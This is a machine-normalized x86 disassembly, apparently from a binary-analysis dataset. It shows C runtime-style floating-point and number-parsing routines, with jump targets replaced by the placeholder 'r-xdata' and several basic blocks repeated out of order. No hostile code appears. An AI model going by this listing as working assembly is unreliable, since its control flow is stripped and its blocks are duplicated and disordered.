shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
mov [ ebp + 0x8 ] esi
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_421d0e
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
cmp ebx 0xffffc001
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
mov [ ebp + 0x8 ] esi
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_422250
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
cmp [ ebp + 0x24 ] ebx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_406b99
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_406efa
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409038
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_4228e0 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
mov [ ebp - 0x58 ] esi
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
cmp al 0x9
mov [ ebp - 0x5c ] esi
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_423607
mov eax [ ebp - 0x64 ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x68 ] ecx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] ecx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x7c ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov esi rw-data
sub esi 0x60
cmp eax ecx
mov [ ebp - 0x54 ] eax
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] ecx
jne r-xdata
neg eax
mov esi rw-data
mov [ ebp - 0x54 ] eax
sub esi 0x60
cmp [ ebp - 0x54 ] ecx
je r-xdata
mov [ ebp - 0x3c ] cx
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add esi 0x54
and eax 0x7
test eax eax
mov [ ebp - 0x4c ] esi
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax esi
mov ebx eax
cmp [ ebx ] 0x8000
mov [ ebp - 0x70 ] ebx
jb r-xdata
movzx edx [ ebx + 0xa ]
mov ecx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax edx
mov edi 0x7fff
xor eax ecx
and ecx edi
and edx edi
and eax 0x8000
cmp cx 0x7fff
lea edi [ edx + ecx ]
movzx edi di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
mov esi [ ebp - 0x4c ]
lea ebx [ ebp - 0x48 ]
mov [ ebp - 0x70 ] ebx
neg ax
sbb eax eax
and [ ebp - 0x38 ] 0x0
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp dx 0x7fff
jae r-xdata
cmp di 0xbffd
ja r-xdata
cmp di 0x3fbf
ja r-xdata
test cx cx
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
xor ecx ecx
cmp dx cx
jne r-xdata
inc edi
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
and [ ebp - 0x68 ] ecx
lea esi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edi
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
inc esi
inc esi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x3c ]
add ebx 0x8
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ebx
cmp [ ebx + 0x4 ] ecx
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add ecx ecx
test edx edx
mov [ ebp - 0x64 ] edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x78 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebx ] ecx
jne r-xdata
and [ ebp - 0x32 ] cx
jmp r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x24 ] 0x80000000
jne r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x78 ] 0x0
mov [ esi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] ecx
jmp r-xdata
cmp [ ebp - 0x2c ] 0x8000
ja r-xdata
mov ecx edi
neg ecx
movzx esi cx
add edi esi
test di di
jg r-xdata
mov esi [ ebp - 0x28 ]
mov ecx [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr ecx 0x1f
mov edx esi
add esi esi
or esi ecx
mov ecx [ ebp - 0x24 ]
shr edx 0x1f
add ecx ecx
or ecx edx
add edi 0xffff
test di di
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ecx
jg r-xdata
mov ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx ecx [ ecx ]
and [ ebp - 0x78 ] 0x0
imul ecx edx
mov edx [ esi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
mov ebx [ ebp - 0x70 ]
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
